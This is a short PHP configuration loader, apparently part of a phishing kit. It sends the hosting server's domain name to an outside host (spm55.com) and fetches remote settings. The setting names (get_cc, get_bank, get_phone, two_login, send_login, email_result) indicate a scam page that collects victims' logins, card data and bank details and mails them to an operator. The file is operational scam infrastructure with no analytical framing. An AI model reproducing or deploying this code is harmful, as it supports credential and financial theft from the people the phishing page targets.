<?php
$domain = $_SERVER['SERVER_NAME'];
$markicob=curl_init();
curl_setopt($markicob,CURLOPT_URL,"https://spm55.com/get_setting?domain=".$domain);
curl_setopt($markicob,CURLOPT_RETURNTRANSFER,true);
curl_setopt($markicob,CURLOPT_IPRESOLVE,CURL_IPRESOLVE_V4);
$onani=curl_exec($markicob);
curl_close($markicob);
$config = json_decode($onani, true);

$email_result = $config[0]["email_result"];
$sender_mail = $config[0]["sender_mail"];
$site_parameter = $config[0]["site_parameter"];
$site_param_on = $config[0]["site_param_on"];
$get_email = $config[0]["get_email"];
$two_login = $config[0]["two_login"];
$two_email = $config[0]["two_email"];
$get_cc = $config[0]["get_cc"];
$get_pap = $config[0]["get_pap"];
$alert_type = $config[0]["alert_type"];
$send_login = $config[0]["send_login"];
$get_phone = $config[0]["get_phone"];
$get_bank = $config[0]["get_bank"];
?>